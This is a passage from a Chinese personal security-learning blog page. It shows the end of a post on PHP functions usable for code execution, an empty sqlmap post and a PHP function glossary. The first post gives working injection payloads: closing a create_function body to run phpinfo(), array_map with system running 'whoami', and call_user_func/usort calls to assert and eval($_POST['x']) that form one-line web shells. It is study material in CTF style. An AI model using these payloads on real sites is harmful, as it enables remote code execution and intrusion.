<li><strong>利用函数执行代码</strong><br>其实感觉原理和sql注入有点像,先将前面的语句闭合,再写入想要执行的代码,最后将后面的语句注释<br>前提是,参数二是用变量拼接的,如<code>$c=&#39;echo &#39;.&#39;($s&#39;.&#39;+&#39;.&quot;$a)&quot;.&#39;;&#39;;</code><br>例如,$a,$b是_GET传参的<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[a];</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;echo &#x27;</span>.<span class="string">&#x27;($s&#x27;</span>.<span class="string">&#x27;+&#x27;</span>.<span class="string">&quot;<span class="subst">$a</span>)&quot;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$New</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$s&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$New</span>(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
实际效果:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">New</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="number">100</span>+<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
那我们构造一个payload:<code>?a=888);&#125;phpinfo();/*</code><br>原函数变成:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="number">100</span>+<span class="number">888</span>);&#125;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    <span class="comment">/*);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="array-map-参1-参2"><a href="#array-map-参1-参2" class="headerlink" title="array_map(参1,参2)"></a>array_map(参1,参2)</h3><p>为数组的每个元素应用回调函数<br>参数1为回调函数(可以是自己定义的,也可以是php自带的),参数2是一个数组,每个元素将会被作为命令放在回调函数里执行<br>例如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;system&#x27;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="call-user-func-参1-参2"><a href="#call-user-func-参1-参2" class="headerlink" title="call_user_func(参1,参2)"></a>call_user_func(参1,参2)</h3><p>和array_map()相似,参数1为回调函数,参数2是一个变量,作为回调函数的参数或命令<br>再给个例子payload&#x3D;<code>?a=phpinfo()</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(assert,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h3 id="call-user-func-array-参数1-参数2"><a href="#call-user-func-array-参数1-参数2" class="headerlink" title="call_user_func_array(参数1,参数2)"></a>call_user_func_array(参数1,参数2)</h3><p>和array_map()相似,参数1是回调函数,参数2为数组</p>
<h3 id="array-filter-参数1-参数2"><a href="#array-filter-参数1-参数2" class="headerlink" title="array_filter(参数1,参数2)"></a>array_filter(参数1,参数2)</h3><p>使用回调函数过滤数组的元素<br>参数1是一个数组,参数2是回调函数</p>
<h3 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h3><p>使用用户自定义的比较函数对数组中的值进行排序<br>先贴一个别人的,有点没看懂</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php环境&gt;=<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);<span class="meta">?&gt;</span></span><br><span class="line">利用方式：</span><br><span class="line">test.php?<span class="number">1</span>[]=<span class="number">1</span>-<span class="number">1</span>&amp;<span class="number">1</span>[]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert</span><br><span class="line">[POST]:x=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">php环境&gt;=&lt;<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">利用方式：</span><br><span class="line">test.php?<span class="number">1</span>=<span class="number">1</span>+<span class="number">1</span>&amp;<span class="number">2</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x])</span><br><span class="line">[POST]:x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
<h3 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h3><p>使用用户定义的比较函数对数组进行排序并保持索引关联</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/13/sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">sqlmap工具的使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-04-13 21:05:31 / 修改时间：21:06:54" itemprop="dateCreated datePublished" datetime="2023-04-13T21:05:31+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>0</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/12/%E5%AD%A6%E4%B9%A0%E9%98%85%E8%AF%BB%E4%BB%A3%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/12/%E5%AD%A6%E4%B9%A0%E9%98%85%E8%AF%BB%E4%BB%A3%E7%A0%81/" class="post-title-link" itemprop="url">学习阅读代码</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-12 21:00:52" itemprop="dateCreated datePublished" datetime="2023-04-12T21:00:52+08:00">2023-04-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-29 20:03:11" itemprop="dateModified" datetime="2023-05-29T20:03:11+08:00">2023-05-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><h2 id="error-reporting-error-level"><a href="#error-reporting-error-level" class="headerlink" title="error_reporting(error_level)"></a>error_reporting(error_level)</h2><p>设置应该报告何种 PHP 错误<br>error_level&#x3D;0 是关闭所有php错误报告</p>
<h2 id="fwrite-参1-’参2’-参3"><a href="#fwrite-参1-’参2’-参3" class="headerlink" title="fwrite(参1,’参2’,参3)"></a>fwrite(参1,’参2’,参3)</h2><p>将参数2写入参数1,最长字符数为参3</p>
<h2 id="mysql-query-sql"><a href="#mysql-query-sql" class="headerlink" title="mysql_query($sql)"></a>mysql_query($sql)</h2><ol>
<li><strong>作用</strong><br>发送一个 MySQL 查询</li>
<li><strong>注意</strong><br>此扩展在 PHP 5.5.0 中已弃用，并在 PHP 7.0.0 中被删除。<br>替代方案包括：<code>mysqli_query()</code>   <code>PDO::查询()</code><br>(i)表示改进，其执行速度更快.</li>
</ol>
<h2 id="mysqli-fetch-array"><a href="#mysqli-fetch-array" class="headerlink" title="mysqli_fetch_array()"></a>mysqli_fetch_array()</h2><p>使用或输出所有查询的数据。</p>
<h2 id="mysqli-connect"><a href="#mysqli-connect" class="headerlink" title="mysqli_connect()"></a>mysqli_connect()</h2><p>函数来连接数据库。</p>
<h2 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h2><p>判断一个变量是否为空,如果var不存在或值为空或等于零,则返回空,否则返回false。</p>
<h2 id="die-函数"><a href="#die-函数" class="headerlink" title="die()函数"></a>die()函数</h2><p>用于输出一个消息并且退出当前程序，可接受一个可选参数，用于规定在退出脚本之前写入的消息或状态号。 </p>
<h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir()"></a>mkdir()</h2><p>用于创建目录。必选参数为我们要在其中创建目录的目录路径。</p>
<h2 id="chdir-参数1"><a href="#chdir-参数1" class="headerlink" title="chdir(参数1)"></a>chdir(参数1)</h2><p>函数改变当前的目录。参数1代表新的当前目录</p>
<h2 id="stripos-参1-参2-参3"><a href="#stripos-参1-参2-参3" class="headerlink" title="stripos(参1,参2,参3)"></a>stripos(参1,参2,参3)</h2><p>参1	必需。规定被搜索的字符串。<br>参2	必需。规定要查找的字符。<br>参3	可选。规定开始搜索的位置。<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。</p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>用于将整个文件读入到一个字符串中。它接受一个文件名作为参数，并返回该文件的内容。例如：<br><code>$contents = file_get_contents(&#39;index.php&#39;);</code><br>这行代码将读取名为 <code>index.php</code> 的文件，并将其内容存储在 $contents 变量中</p>
<h2 id="file-put-contents-参1-参2"><a href="#file-put-contents-参1-参2" class="headerlink" title="file_put_contents(参1,参2)"></a>file_put_contents(参1,参2)</h2><p>它用于将字符串写入文件中。它的功能与依次调用 fopen()，fwrite() 以及 fclose()相同。<strong>将参数二的内容写入参数1的文件中</strong><br>成功返回写入到文件内数据的字节数，失败则返回 FALSE。</p>
<h2 id="array-push"><a href="#array-push" class="headerlink" title="array_push()"></a>array_push()</h2><p>array_push() 函数向数组尾部插入一个或多个元素。</p>
<h2 id="strcmp-参1-参2"><a href="#strcmp-参1-参2" class="headerlink" title="strcmp(参1,参2)"></a>strcmp(参1,参2)</h2><p><code>strcmp</code>用来比较参1,参2的大小,如果<code>参1&gt;参2</code>返回<code>1</code>,<code>参2&gt;参1</code>返回<code>-1</code>,<code>参1=参2</code>返回<code>0</code><br>需要注意的是参1和参2都必须为字符串,​php 5.2​​版本之前，利用​​strcmp​​函数将数组与字符串进行比较会返回​​-1​​，但是从​​5.3​​开始，会返回​​0​​。</p>
<h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><p><code>scandir()</code> 函数返回指定目录中的文件和目录的数组<br>成功则返回文件和目录的数组。失败则返回 FALSE。如果 directory 不是一个目录，则抛出 E_WARNING 级别的错误。<br>可以在达成代码执行时使用此函数进行,对目标文件进行获取,使用print_r()输出数组</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="？？喵！！"
      src="/images/hearder.jpg">
  <p class="site-author-name" itemprop="name">？？喵！！</p>
  <div class="site-description" itemprop="description">瞄一下学过代码，写一个睡喵的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">？？喵！！</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">83k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:56</span>
</div>

<!--
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>-->




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
</html>

